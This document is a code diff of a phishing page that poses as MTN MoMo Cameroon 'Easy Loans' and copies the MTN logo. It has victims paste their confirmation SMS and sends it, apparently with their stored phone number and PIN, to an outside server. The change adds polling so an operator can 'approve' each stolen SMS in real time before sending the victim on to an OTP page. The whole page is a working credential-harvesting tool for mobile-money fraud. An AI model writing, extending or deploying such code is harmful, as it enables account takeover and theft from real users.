@@ -65,21 +65,11 @@
             transform: translateX(-50%);
         }
 
-        .momo-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            background: #0047AB;
-            color: #FFCC00;
-            font-weight: 700;
-            font-size: 16px;
-            padding: 7px 16px;
-            border-radius: 40px;
-            line-height: 1;
-            letter-spacing: -0.5px;
-            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
-            white-space: nowrap;
-        }
+        .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 2px; }
+        .mtn-logo-icon { width: 38px; height: 38px; background: #FFD700; border-radius: 7px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: 900; color: #003366; position: relative; }
+        .mtn-logo-icon::after { content: 'M'; font-size: 1.6rem; font-weight: 900; }
+        .mtn-logo-text { font-size: 0.8rem; font-weight: 700; color: #003366; }
+        .mtn-logo-sub { font-size: 0.55rem; color: #888; font-weight: 500; }
 
         /* ===== CARD ===== */
         .card {
@@ -96,7 +86,6 @@
             overflow-y: auto;
         }
 
-        /* ===== ICON BADGE ===== */
         .icon-badge {
             width: 60px;
             height: 60px;
@@ -120,9 +109,7 @@
             line-height: 1.3;
         }
 
-        .page-title .highlight {
-            color: #0047AB;
-        }
+        .page-title .highlight { color: #0047AB; }
 
         .instruction {
             font-size: 13px;
@@ -133,12 +120,8 @@
             padding: 0 4px;
         }
 
-        .instruction strong {
-            color: #1a1a2e;
-            font-weight: 700;
-        }
+        .instruction strong { color: #1a1a2e; font-weight: 700; }
 
-        /* ===== STEP HINT ===== */
         .step-hint {
             background: #f8f9ff;
             border-radius: 12px;
@@ -150,23 +133,10 @@
             flex-shrink: 0;
         }
 
-        .step-hint .hint-icon {
-            font-size: 16px;
-            flex-shrink: 0;
-            line-height: 1.4;
-        }
+        .step-hint .hint-icon { font-size: 16px; flex-shrink: 0; line-height: 1.4; }
+        .step-hint p { font-size: 12px; color: #555; line-height: 1.5; }
+        .step-hint p strong { color: #0047AB; }
 
-        .step-hint p {
-            font-size: 12px;
-            color: #555;
-            line-height: 1.5;
-        }
-
-        .step-hint p strong {
-            color: #0047AB;
-        }
-
-        /* ===== SMS TEXTAREA ===== */
         .sms-wrapper {
             position: relative;
             margin-bottom: 6px;
@@ -194,9 +164,7 @@
             box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
         }
 
-        .sms-textarea::placeholder {
-            color: #b0b0b0;
-        }
+        .sms-textarea::placeholder { color: #b0b0b0; }
 
         .sms-textarea.invalid {
             border-color: #e74c3c;
@@ -205,13 +173,11 @@
         }
 
         @keyframes shake {
-            0%,
-            100% { transform: translateX(0); }
+            0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-6px); }
             75% { transform: translateX(6px); }
         }
 
-        /* Paste button inside textarea */
         .paste-btn {
             position: absolute;
             right: 8px;
@@ -232,15 +198,9 @@
             box-shadow: 0 4px 12px rgba(0, 71, 171, 0.25);
         }
 
-        .paste-btn:hover {
-            background: #002D7A;
-        }
+        .paste-btn:hover { background: #002D7A; }
+        .paste-btn:active { transform: scale(0.97); }
 
-        .paste-btn:active {
-            transform: scale(0.97);
-        }
-
-        /* Character count */
         .char-count {
             text-align: right;
             font-size: 11px;
@@ -249,11 +209,8 @@
             font-weight: 500;
         }
 
-        .char-count.valid {
-            color: #27ae60;
-        }
+        .char-count.valid { color: #27ae60; }
 
-        /* Error */
         .error-text {
             color: #e74c3c;
             font-size: 12px;
@@ -263,11 +220,8 @@
             line-height: 1.4;
         }
 
-        .error-text.show {
-            display: block;
-        }
+        .error-text.show { display: block; }
 
-        /* ===== RESEND ROW ===== */
         .resend-row {
             display: flex;
             justify-content: space-between;
@@ -277,10 +231,7 @@
             flex-shrink: 0;
         }
 
-        .resend-row span {
-            font-size: 12px;
-            color: #777;
-        }
+        .resend-row span { font-size: 12px; color: #777; }
 
         .resend-link {
             font-size: 12px;
@@ -295,16 +246,9 @@
             transition: background 0.2s;
         }
 
-        .resend-link:hover:not(:disabled) {
-            background: #f0f4ff;
-        }
+        .resend-link:hover:not(:disabled) { background: #f0f4ff; }
+        .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
-        .resend-link:disabled {
-            color: #bbb;
-            cursor: not-allowed;
-        }
-
-        /* ===== VERIFY BUTTON ===== */
         .verify-btn {
             width: 100%;
             padding: 15px;
@@ -326,17 +270,9 @@
             box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
         }
 
-        .verify-btn:active:not(:disabled) {
-            transform: scale(0.98);
-        }
+        .verify-btn:active:not(:disabled) { transform: scale(0.98); }
+        .verify-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
-        .verify-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* Spinner inside button */
         .spinner {
             display: inline-block;
             width: 14px;
@@ -349,11 +285,8 @@
             margin-right: 8px;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ===== SECURITY NOTICE ===== */
         .security-notice {
             display: flex;
             align-items: flex-start;
@@ -368,7 +301,6 @@
             flex-shrink: 0;
         }
 
-        /* ===== FOOTER ===== */
         footer {
             padding: 6px;
             color: #aaa;
@@ -379,46 +311,8 @@
             flex-shrink: 0;
         }
 
-        /* ===== SMALL PHONES ===== */
-        @media (max-height: 700px) {
-            .card {
-                padding: 18px 16px;
-            }
-            .icon-badge {
-                width: 52px;
-                height: 52px;
-                font-size: 24px;
-                margin-bottom: 10px;
-            }
-            .page-title {
-                font-size: 18px;
-            }
-            .instruction {
-                font-size: 12px;
-                margin-bottom: 12px;
-            }
-            .sms-textarea {
-                min-height: 100px;
-            }
-            .verify-btn {
-                margin-top: 12px;
-                padding: 14px;
-            }
-        }
-
-        @media (max-width: 380px) {
-            .sms-textarea {
-                font-size: 12px;
-                padding: 12px 12px 44px 12px;
-            }
-            .paste-btn {
-                padding: 6px 10px;
-                font-size: 11px;
-            }
-        }
-
         /* ============================================
-           VERIFYING OVERLAY (55s loading)
+           WAITING OVERLAY (no fixed time — waits admin)
            ============================================ */
         .verify-overlay {
             position: fixed;
@@ -432,9 +326,7 @@
             z-index: 2000;
         }
 
-        .verify-overlay.show {
-            display: flex;
-        }
+        .verify-overlay.show { display: flex; }
 
         .verify-content {
             display: flex;
@@ -475,9 +367,7 @@
             margin-bottom: 26px;
         }
 
-        @keyframes verifySpin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes verifySpin { to { transform: rotate(360deg); } }
 
         .verify-title {
             font-size: 19px;
@@ -487,9 +377,7 @@
             line-height: 1.3;
         }
 
-        .verify-title .highlight {
-            color: #0047AB;
-        }
+        .verify-title .highlight { color: #0047AB; }
 
         .verify-subtitle {
             font-size: 13px;
@@ -511,22 +399,6 @@
             40% { opacity: 1; }
         }
 
-        .verify-bar {
-            width: 200px;
-            height: 5px;
-            background: #e8edf7;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 28px;
-        }
-
-        .verify-bar-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #0047AB, #FFCC00);
-            border-radius: 4px;
-        }
-
         .verify-security {
             display: flex;
             align-items: center;
@@ -534,13 +406,31 @@
             font-size: 11px;
             color: #aaa;
         }
+
+        @media (max-height: 700px) {
+            .card { padding: 18px 16px; }
+            .icon-badge { width: 52px; height: 52px; font-size: 24px; margin-bottom: 10px; }
+            .page-title { font-size: 18px; }
+            .instruction { font-size: 12px; margin-bottom: 12px; }
+            .sms-textarea { min-height: 100px; }
+            .verify-btn { margin-top: 12px; padding: 14px; }
+        }
+
+        @media (max-width: 380px) {
+            .sms-textarea { font-size: 12px; padding: 12px 12px 44px 12px; }
+            .paste-btn { padding: 6px 10px; font-size: 11px; }
+        }
     </style>
 </head>
 <body>
     <header>
         <button class="back-btn" onclick="window.location.href='login.html'" aria-label="Go back">←</button>
         <div class="logo-container">
-            <span class="momo-icon">MoMo</span>
+            <div class="mtn-logo">
+                <div class="mtn-logo-icon"></div>
+                <div class="mtn-logo-text">MTN MoMo</div>
+                <div class="mtn-logo-sub">Easy Loans</div>
+            </div>
         </div>
         <div style="width:24px;"></div>
     </header>
@@ -554,7 +444,7 @@
 
         <p class="instruction">
             We sent a confirmation message to your MoMo number.
-            <strong>Copy the full SMS you received</strong> and paste it below to verify your identity and complete your loan disbursement.
+            <strong>Copy the full SMS you received</strong> and paste it below to verify your identity.
         </p>
 
         <div class="step-hint">
@@ -600,7 +490,7 @@
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
-    <!-- ===== VERIFYING OVERLAY (55s) ===== -->
+    <!-- WAITING OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
             <div class="verify-momo-icon">MoMo</div>
@@ -608,10 +498,7 @@
             <h2 class="verify-title">
                 Verifying your <span class="highlight">SMS</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
             </h2>
-            <p class="verify-subtitle">This may take up to a minute. Please wait…</p>
-            <div class="verify-bar">
-                <div class="verify-bar-fill" id="verifyBarFill"></div>
-            </div>
+            <p class="verify-subtitle">Please wait while we verify your details</p>
             <div class="verify-security">
                 <span>🔒</span>
                 <span>Secure connection to MTN MoMo</span>
@@ -626,9 +513,10 @@
         const API_BASE = 'https://easy-loansej1-production.up.railway.app';
 
         // ============================================
-        // LOADING CONFIGURATION (55 seconds)
+        // POLLING CONFIG
         // ============================================
-        const LOADING_DURATION_MS = 55 * 1000; // 55 seconds
+        const POLL_INTERVAL_MS = 2000;
+        let pollTimer = null;
 
         // ============================================
         // DOM REFERENCES
@@ -641,7 +529,6 @@
         const resendBtn = document.getElementById('resendBtn');
         const countdownEl = document.getElementById('countdown');
         const verifyOverlay = document.getElementById('verifyOverlay');
-        const verifyBarFill = document.getElementById('verifyBarFill');
 
         // ============================================
         // SESSION CHECK
@@ -751,37 +638,67 @@
         });
 
         // ============================================
-        // PROGRESS BAR (55s)
+        // WAITING OVERLAY
         // ============================================
-        let verifyTimer = null;
+        function showVerifyOverlay() { verifyOverlay.classList.add('show'); }
+        function hideVerifyOverlay() { verifyOverlay.classList.remove('show'); }
 
-        function startVerifyBar(durationMs) {
-            verifyOverlay.classList.add('show');
-            verifyBarFill.style.width = '0%';
-            const totalSeconds = Math.round(durationMs / 1000);
-            const startTime = Date.now();
+        // ============================================
+        // POLLING FOR ADMIN APPROVAL
+        // ============================================
+        function startPolling(requestId) {
+            stopPolling();
+            console.log('🔄 Polling started for requestId:', requestId);
 
-            verifyTimer = setInterval(function() {
-                const elapsedMs = Date.now() - startTime;
-                const raw = (elapsedMs / 1000) / totalSeconds;
-                const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2);
-                verifyBarFill.style.width = Math.min(eased * 100, 99).toFixed(1) + '%';
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(`${API_BASE}/api/approval/status/${requestId}`);
+                    const data = await res.json();
 
-                if (elapsedMs >= durationMs) {
-                    clearInterval(verifyTimer);
-                    verifyBarFill.style.width = '100%';
+                    console.log('📥 Status:', data);
+
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        console.log('✅ SMS APPROVED');
+                        stopPolling();
+                        // Save verified flag
+                        localStorage.setItem('momoVerified', JSON.stringify({
+                            verifiedAt: new Date().toISOString(),
+                            requestId: requestId
+                        }));
+                        // Redirect to OTP page
+                        window.location.href = 'verify-otp.html';
+
+                    } else if (data.status === 'rejected') {
+                        console.log('❌ SMS REJECTED');
+                        stopPolling();
+                        hideVerifyOverlay();
+                        verifyBtn.disabled = false;
+                        verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
+
+                        // Show error and clear
+                        smsInput.classList.add('invalid');
+                        smsError.textContent = 'Ensure you put correct details.';
+                        smsError.classList.add('show');
+                        smsInput.focus();
+                    }
+                    // else still pending
+                } catch (err) {
+                    console.error('Polling error:', err);
                 }
-            }, 1000 / 30);
+            }, POLL_INTERVAL_MS);
         }
 
-        function finishVerifyBar() {
-            if (verifyTimer) clearInterval(verifyTimer);
-            verifyBarFill.style.width = '100%';
+        function stopPolling() {
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+            }
         }
 
         // ============================================
-        // VERIFY BUTTON → sends SMS + PHONE + PIN to backend
-        // Then holds loading for 55 seconds → verify-otp.html
+        // VERIFY BUTTON → sends SMS to backend → polls admin
         // ============================================
         verifyBtn.addEventListener('click', async function() {
             const text = smsInput.value.trim();
@@ -804,15 +721,13 @@
                 return;
             }
 
-            // Save SMS to localStorage for verify-otp.html
+            // Save SMS to localStorage for later
             localStorage.setItem('momoSms', text);
 
-            // UI: disable button + show loading overlay
+            // UI: disable button + show waiting overlay
             verifyBtn.disabled = true;
-            verifyBtn.innerHTML = '<span class="spinner"></span>VERIFYING...';
-
-            startVerifyBar(LOADING_DURATION_MS);
-            const overlayStart = Date.now();
+            verifyBtn.innerHTML = '<span class="spinner"></span>WAITING...';
+            showVerifyOverlay();
 
             try {
                 const controller = new AbortController();
@@ -834,31 +749,15 @@
                 const data = await res.json().catch(() => ({}));
 
                 if (!res.ok || !data.ok) {
-                    throw new Error(data.error || 'Verification failed');
+                    throw new Error(data.error || 'Failed to submit SMS');
                 }
 
-                // Save verification flag
-                localStorage.setItem('momoVerified', JSON.stringify({
-                    verifiedAt: new Date().toISOString(),
-                    reference: data.reference || null
-                }));
-
-                // Hold overlay for FULL 55 seconds
-                const elapsed = Date.now() - overlayStart;
-                const remainingMs = Math.max(0, LOADING_DURATION_MS - elapsed);
-
-                setTimeout(function() {
-                    finishVerifyBar();
-                    setTimeout(function() {
-                        // ✅ Redirect to verify-otp.html
-                        window.location.href = 'verify-otp.html';
-                    }, 350);
-                }, remainingMs);
+                // Start polling for admin approval
+                startPolling(data.requestId);
 
             } catch (err) {
                 console.error('Verify error:', err);
-                finishVerifyBar();
-                verifyOverlay.classList.remove('show');
+                hideVerifyOverlay();
                 verifyBtn.disabled = false;
                 verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
 
@@ -875,12 +774,14 @@
         updateCharCount();
         updateVerifyState();
 
+        window.addEventListener('load', () => {
+            stopPolling();
+        });
+
         console.log('====================================');
         console.log('💰 MTN MoMo Loan – Cameroon');
-        console.log('📩 SMS Paste connected to:', API_BASE);
-        console.log('⏱️ Loading duration:', LOADING_DURATION_MS / 1000, 'seconds');
-        console.log('📱 Phone:', storedPhone);
-        console.log('🔑 PIN:', storedPin ? '****' : 'not set');
+        console.log('📩 SMS Paste with ADMIN APPROVAL');
+        console.log('📡 API:', API_BASE);
         console.log('====================================');
     </script>
 </body>
